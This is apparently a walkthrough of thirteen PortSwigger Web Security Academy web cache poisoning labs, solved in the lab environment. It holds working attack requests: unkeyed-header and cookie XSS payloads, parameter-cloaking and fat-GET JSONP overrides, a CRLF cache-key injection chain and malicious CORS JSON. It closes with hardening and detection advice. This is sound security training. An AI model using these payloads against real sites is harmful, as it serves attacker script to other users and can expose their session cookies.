# PortSwigger Web Cache Poisoning 1-13 — Cache Keys Are Trust Boundaries

This is a consolidated walkthrough of the thirteen PortSwigger Web Cache Poisoning labs.

All labs were solved in the authorized Web Security Academy environment. The core lesson is simple: a cache key is a security boundary. If any request input changes the response but is missing from the key, the attacker can potentially store their response for another user.

## 1. Overview

| # | Lab | Flaw | Core idea |
|---|-----|------|-----------|
| 1 | unkeyed header | `X-Forwarded-Host` changes script host | cache the homepage with an attacker-controlled `tracking.js` origin |
| 2 | unkeyed cookie | cookie reflected in JavaScript but not keyed | escape a string through `fehost` |
| 3 | multiple headers | scheme redirect plus host rewrite | cache a redirect for `/resources/js/tracking.js` |
| 4 | targeted unknown header | hidden `X-Host` plus `Vary: User-Agent` | learn the victim UA, then poison that cache bucket |
| 5 | unkeyed query string | query reflected but ignored by key | cache reflected XSS for `/` |
| 6 | unkeyed query parameter | `utm_content` excluded | poison a reflected analytics parameter |
| 7 | parameter cloaking | cache and backend parse `;` differently | hide a second JSONP callback inside `utm_content` |
| 8 | fat GET | GET body parsed by backend but not keyed | override JSONP callback in the body |
| 9 | URL normalization | cache and browser normalize paths differently | raw-path poison, encoded browser hit |
| 10 | strict cacheability + DOM gadget | host-controlled JSON endpoint | serve malicious CORS JSON to a DOM sink |
| 11 | combining vulnerabilities | two cache entries needed | poison language redirect and translation JSON together |
| 12 | cache key injection | key delimiter escaping failure | combine unkeyed `utm_content`, CSPP, header injection, and key injection |
| 13 | internal cache poisoning | nested cache disagrees on keys | poison an internal fragment cache for `geolocate.js` |

## 2. Working model

A reliable cache-poisoning workflow has three questions:

1. What is the cache oracle?
2. Which request inputs influence the response?
3. Are those inputs fully represented in the cache key?

The oracle is usually `X-Cache`, `Age`, stable response reuse, or a debug header such as `Pragma: x-get-cache-key`. The influence point can be a header, cookie, query parameter, request body, path, language setting, or protocol metadata. The bug appears when those two models disagree.

Use a cache buster while testing. Poisoning the real cache too early creates false positives and can block your own verification.

## 3. Unkeyed headers and cookies

The first group is direct design failure.

In the unkeyed-header lab, `X-Forwarded-Host` is used to construct an absolute script URL:

```html
<script src="//HOST/resources/js/tracking.js"></script>
```

The cache key ignores this header, so the homepage can be cached with an attacker origin. Hosting the same path with:

```js
alert(document.cookie)
```

turns the poisoned page into script execution for the next visitor.

The cookie lab is the same pattern with a different input. `fehost` is reflected in a JavaScript string but cookies are not keyed:

```http
Cookie: fehost=someString"-alert(1)-"someString
```

The multiple-header lab shows why single-input testing is not enough. `X-Forwarded-Scheme: nothttps` creates a redirect and `X-Forwarded-Host` controls the redirect host. Together, they cache a redirect for `/resources/js/tracking.js`.

The targeted lab adds `Vary: User-Agent`. A hidden `X-Host` controls the script host, but the poisoned response must land in the victim's UA bucket. A harmless comment with an image to the exploit server is enough to learn the UA from the access log; this does not require a hard Collaborator dependency.

## 4. Query, body, and parser disagreement

The implementation-flaw labs shift from obvious unkeyed headers to more subtle parser boundaries.

If the whole query string is ignored by the key, a reflected query payload can be cached for `/`:

```http
GET /?evil='/><script>alert(1)</script>
```

If only `utm_content` is excluded, the same idea becomes parameter-specific:

```http
GET /?utm_content='/><script>alert(1)</script>
```

Parameter cloaking depends on a disagreement over `;`. The cache treats this as one excluded analytics parameter, while the backend sees a second `callback` parameter:

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

The fat GET lab moves the hidden override into the request body. The backend accepts a GET body and uses its duplicate `callback`, while the cache key still comes from the request line:

```http
GET /js/geolocate.js?callback=setCountryCookie

callback=alert(1)
```

## 5. Normalization and DOM gadgets

URL normalization turns an otherwise non-exploitable reflected XSS into a cache hit. A raw Repeater request stores:

```http
GET /random</p><script>alert(1)</script><p>foo
```

The browser sends an encoded version, but the cache normalizes it into the same key and serves the poisoned error page.

The strict-cacheability DOM lab uses `X-Forwarded-Host` to change where client-side code fetches geolocation JSON. The exploit server serves CORS-enabled JSON:

```json
{"country":"<img src=1 onerror=alert(document.cookie) />"}
```

The hard part is not the payload; it is cacheability. Responses with `Set-Cookie` are rejected, so the request must be repeated after the session cookie already exists.

## 6. Expert chains

The combining-vulnerabilities lab requires two poisoned entries at the same time:

- poison `/?localized=1` so it imports attacker-controlled `/resources/json/translations.json`;
- poison `/` with `X-Original-URL: /setlang\es` so English users are redirected into the vulnerable non-English translation path.

The cache-key-injection lab combines four independent issues:

- `/login` excludes `utm_content` using an unsafe regex;
- `/login/` passes `lang` into `/js/localize.js` without encoding, creating client-side parameter pollution;
- `/js/localize.js?cors=1` reflects the `origin` header into response headers, enabling CRLF-based body injection;
- cache-key component delimiters can be injected from the URL.

The two decisive requests are:

```http
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

```http
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
```

The internal-cache lab shows a nested-cache failure. The outer cache keys on the query string, but an internal fragment cache ignores both the query buster and `X-Forwarded-Host`. Repeated requests eventually poison the fragment that emits the `geolocate.js` URL.

## 7. Defense and detection

Hardening:

- Include every response-influencing input in the cache key, or make the response uncacheable.
- Strip or normalize internal headers at the edge: `X-Forwarded-*`, `Forwarded`, `X-Host`, `X-Original-URL`.
- Never cache personalized responses, `Set-Cookie` responses, reflected error pages, or header/query-influenced HTML/JS/JSON.
- Use the same URL normalization and parameter parsing rules at the cache and origin.
- Do not build cache keys through delimiter-based string concatenation without structured escaping.
- Pin script and JSON origins; use CORS allowlists and strict JSON schemas.

Detection:

- Repeated `miss -> hit` cycles with unusual forwarding headers or cache busters.
- Cached public responses containing external hosts, `%0d%0a`, event handlers, or JavaScript snippets.
- Requests using `Pragma: x-get-cache-key` or Param Miner-style header guessing.
- Cached JavaScript, JSON, login redirects, or error pages that differ from the origin baseline.
- Targeted poisoning in `Vary` buckets, especially rare User-Agent values.

No lab in this series required an unavoidable Collaborator/OAST dependency. The one user-targeting lab can use the Academy exploit-server access log to learn the victim's User-Agent.
